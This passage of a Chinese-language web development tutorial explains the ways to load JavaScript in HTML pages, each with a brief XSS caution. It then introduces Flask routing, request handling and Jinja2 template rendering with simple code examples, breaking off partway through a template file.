元素中。这种方法简单直观，适用于少量的脚本代码。</p><h4 id="用法："><a href="#用法：" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Inline JavaScript Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, World!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-comment">// 这是内联 JavaScript 代码</span></span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This is an inline JavaScript script.&#x27;</span>);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="适用场景："><a href="#适用场景：" class="headerlink" title="适用场景："></a>适用场景：</h4><ul><li>当 JavaScript 代码量较少时，例如一个简单的交互。</li><li>临时或快速测试小功能的场景。</li></ul><h4 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h4><ul><li><strong>可维护性差</strong>：如果代码量较大，内联代码会使 HTML 文件难以维护和阅读。</li><li><strong>安全性问题</strong>：由于代码直接嵌入到 HTML 中，容易受到跨站脚本攻击（XSS）。应该谨慎使用，避免直接插入用户输入数据。</li></ul><hr><h3 id="2-外部-JavaScript-文件"><a href="#2-外部-JavaScript-文件" class="headerlink" title="2. 外部 JavaScript 文件"></a>2. <strong>外部 JavaScript 文件</strong></h3><p>外部 JavaScript 是将 JavaScript 代码放在单独的文件中，并通过 <code>&lt;script&gt;</code> 标签引入。这种方式有利于代码的复用、管理和维护。</p><h4 id="用法：-1"><a href="#用法：-1" class="headerlink" title="用法："></a>用法：</h4><p>首先，创建一个外部 JavaScript 文件，如 <code>script.js</code>，并编写代码：</p><p><strong><code>script.js</code> 文件：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 这是一个外部 JavaScript 文件</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;This script is from an external JavaScript file.&#x27;</span>);<br></code></pre></td></tr></table></figure><p>然后，在 HTML 中引入该外部文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>External JavaScript Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 引入外部 JavaScript 文件 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, External Script!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="适用场景：-1"><a href="#适用场景：-1" class="headerlink" title="适用场景："></a>适用场景：</h4><ul><li>当 JavaScript 代码量较大时，或需要多个页面共享相同的 JavaScript 代码时。</li><li>外部文件更易于版本控制、团队协作和性能优化（例如浏览器缓存 JavaScript 文件）。</li></ul><h4 id="注意事项：-1"><a href="#注意事项：-1" class="headerlink" title="注意事项："></a>注意事项：</h4><ul><li><strong>文件加载顺序</strong>：外部脚本在默认情况下是同步加载的，这意味着 HTML 的解析会等待 JavaScript 文件的加载和执行完成。在大文件或网络较慢时，这会影响页面加载速度。可以通过 <code>async</code> 或 <code>defer</code> 属性来优化加载。</li></ul><hr><h3 id="3-异步与延迟加载-JavaScript（async-和-defer）"><a href="#3-异步与延迟加载-JavaScript（async-和-defer）" class="headerlink" title="3. 异步与延迟加载 JavaScript（async 和 defer）"></a>3. <strong>异步与延迟加载 JavaScript（async 和 defer）</strong></h3><p>为了优化页面加载性能，外部 JavaScript 文件可以使用 <code>async</code> 或 <code>defer</code> 属性，这两个属性控制脚本的加载和执行时机。</p><h4 id="3-1-async-属性"><a href="#3-1-async-属性" class="headerlink" title="3.1 async 属性"></a>3.1 <code>async</code> 属性</h4><p><code>async</code> 会让脚本文件异步加载，加载完成后立即执行。这意味着脚本的执行顺序可能与 HTML 的加载顺序不一致。</p><h4 id="用法：-2"><a href="#用法：-2" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><ul><li>脚本与 HTML 并行加载，且脚本在加载完后立即执行。</li><li>适用于不会依赖 DOM 的独立脚本，比如分析工具、广告代码等。</li></ul><h4 id="3-2-defer-属性"><a href="#3-2-defer-属性" class="headerlink" title="3.2 defer 属性"></a>3.2 <code>defer</code> 属性</h4><p><code>defer</code> 属性也让脚本文件异步加载，但它保证脚本在 HTML 文档完全解析后才会执行，且按顺序执行。</p><h4 id="用法：-3"><a href="#用法：-3" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h4><ul><li><code>defer</code> 保证脚本按顺序执行，且不会阻塞 HTML 的解析。</li><li>适用于依赖 DOM 的 JavaScript 文件。</li></ul><h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Defer and Async Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script1.js&quot;</span> <span class="hljs-attr">async</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;script2.js&quot;</span> <span class="hljs-attr">defer</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Async vs Defer<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="4-事件属性中的-JavaScript"><a href="#4-事件属性中的-JavaScript" class="headerlink" title="4. 事件属性中的 JavaScript"></a>4. <strong>事件属性中的 JavaScript</strong></h3><p>JavaScript 代码还可以直接嵌入到 HTML 元素的事件属性中（如 <code>onclick</code>、<code>onchange</code> 等）。这种方式直接将 JavaScript 写入元素的属性值中，常用于处理简单的事件响应。</p><h4 id="用法：-4"><a href="#用法：-4" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Event Attribute Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;alert(&#x27;Button clicked!&#x27;)&quot;</span>&gt;</span>Click Me!<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="适用场景：-2"><a href="#适用场景：-2" class="headerlink" title="适用场景："></a>适用场景：</h4><ul><li>适用于简单的事件处理，比如按钮点击时弹出提示框。</li><li>快速实现小的交互功能。</li></ul><h4 id="注意事项：-2"><a href="#注意事项：-2" class="headerlink" title="注意事项："></a>注意事项：</h4><ul><li><strong>可维护性差</strong>：将 JavaScript 直接写在 HTML 中会使得代码难以维护，尤其是在复杂应用中，事件处理应通过外部脚本或事件监听器完成。</li><li><strong>安全性问题</strong>：与内联 JavaScript 类似，容易导致 XSS 攻击。</li></ul><hr><h3 id="5-模块化-JavaScript"><a href="#5-模块化-JavaScript" class="headerlink" title="5. 模块化 JavaScript (&lt;script type=&quot;module&quot;&gt;)"></a>5. <strong>模块化 JavaScript (<code>&lt;script type=&quot;module&quot;&gt;</code>)</strong></h3><p>ES6 引入了模块系统，可以通过 <code>&lt;script type=&quot;module&quot;&gt;</code> 来加载 JavaScript 模块文件。这种方式让开发者能够使用模块化的代码组织方式，从而更好地管理大型项目的依赖。</p><h4 id="用法：-5"><a href="#用法：-5" class="headerlink" title="用法："></a>用法：</h4><p>首先，创建一个模块文件 <code>module.js</code>：</p><p><strong><code>module.js</code> 文件：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Hello from the module!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后，在 HTML 中引入模块并使用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>JavaScript Modules Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">import</span> &#123; greet &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./module.js&#x27;</span>;</span><br><span class="language-javascript">        <span class="hljs-title function_">greet</span>();</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>JavaScript Modules<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="适用场景：-3"><a href="#适用场景：-3" class="headerlink" title="适用场景："></a>适用场景：</h4><ul><li>适合大型应用程序，能够以模块化的方式组织代码。</li><li>允许使用 ES6 的 <code>import</code> 和 <code>export</code>，便于依赖管理。</li></ul><h4 id="注意事项：-3"><a href="#注意事项：-3" class="headerlink" title="注意事项："></a>注意事项：</h4><ul><li><strong>浏览器支持</strong>：现代浏览器都支持 <code>&lt;script type=&quot;module&quot;&gt;</code>，但在旧浏览器中可能不兼容。</li><li><strong>严格模式</strong>：模块文件中默认使用严格模式（<code>strict mode</code>），这会带来更严格的语法检查。</li></ul><hr><h3 id="6-动态加载-JavaScript"><a href="#6-动态加载-JavaScript" class="headerlink" title="6. 动态加载 JavaScript"></a>6. <strong>动态加载 JavaScript</strong></h3><p>有时，JavaScript 文件需要在特定条件下或事件发生后再动态加载。这种方式通常用于提高性能或在特定功能需求时加载额外的脚本。</p><h4 id="用法：-6"><a href="#用法：-6" class="headerlink" title="用法："></a>用法：</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Dynamic Script Loading Example<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loadScriptButton&quot;</span>&gt;</span>Load Script<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;loadScriptButton&#x27;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">let</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;script&#x27;</span>);</span><br><span class="language-javascript">            script.<span class="hljs-property">src</span> = <span class="hljs-string">&#x27;dynamic-script.js&#x27;</span>;</span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(script);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="适用场景：-4"><a href="#适用场景：-4" class="headerlink" title="适用场景："></a>适用场景：</h4><ul><li>动态加载资源以减少初始页面加载时间。</li><li>按需加载脚本，例如用户点击按钮后才加载脚本。</li></ul><h4 id="注意事项：-4"><a href="#注意事项：-4" class="headerlink" title="注意事项："></a>注意事项：</h4><ul><li>动态加载的脚本是异步的，因此要确保依赖关系不会被破坏。如果需要按顺序加载多个动态脚本，可以通过回调或 <code>Promise</code> 来控制。</li></ul><hr><p>好的！接下来我将详细展开 <strong>Flask 框架架构与基础概念、常见的安全漏洞、攻击利用方法、安全防御措施、漏洞总结等</strong>，包括详细的代码示例和解释。</p><hr><h2 id="Flask-框架架构与基础概念"><a href="#Flask-框架架构与基础概念" class="headerlink" title="Flask 框架架构与基础概念"></a>Flask 框架架构与基础概念</h2><h3 id="路由机制"><a href="#路由机制" class="headerlink" title="路由机制"></a>路由机制</h3><p>Flask 路由机制通过 <code>@app.route()</code> 装饰器来将 URL 映射到对应的函数。这意味着，用户访问某个 URL 时，Flask 会自动调用对应的视图函数，并返回结果给用户。</p><p><strong>代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Flask!&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ul><li><code>@app.route(&#39;/&#39;)</code> 是路由装饰器，绑定 URL <code>/</code> 到 <code>index</code> 函数。当用户访问根路径 <code>/</code> 时，将调用 <code>index</code> 函数，返回 <code>&quot;Hello, Flask!&quot;</code>。</li><li><code>app.run(debug=True)</code> 启动服务器并启用调试模式，方便开发时查看错误信息。</li></ul><hr><h3 id="请求与响应"><a href="#请求与响应" class="headerlink" title="请求与响应"></a>请求与响应</h3><p>Flask 通过 <code>request</code> 对象来处理 HTTP 请求数据，通过 <code>response</code> 对象来返回响应结果。</p><p><strong>代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">and</span> password == <span class="hljs-string">&quot;password&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Logged in successfully!&quot;</span>&#125;)<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;failure&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Login failed.&quot;</span>&#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ul><li><code>request.form.get(&#39;username&#39;)</code> 用来获取 POST 请求中的表单数据。</li><li>根据用户名和密码进行简单的身份验证，并返回 JSON 响应，通过 <code>jsonify()</code> 函数将 Python 数据结构转换为 JSON 格式。</li></ul><hr><h3 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h3><p>Flask 使用 Jinja2 模板引擎来渲染 HTML 模板，这样可以将动态数据传递到前端页面。</p><p><strong>代码示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>解释</strong>：</p><ul><li><code>render_template(&#39;user.html&#39;, name=name)</code> 加载并渲染 <code>user.html</code> 模板，并将变量 <code>name</code> 传递给模板。</li><li><code>&lt;name&gt;</code> 是 URL 参数，访问 <code>/user/Alice</code> 时，<code>Alice</code> 会被传递给视图函数，渲染到模板中。</li></ul><p>**模板文件 <code>user.html</code>**：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Flask Template<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;&#123; name &#125;&#125;!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 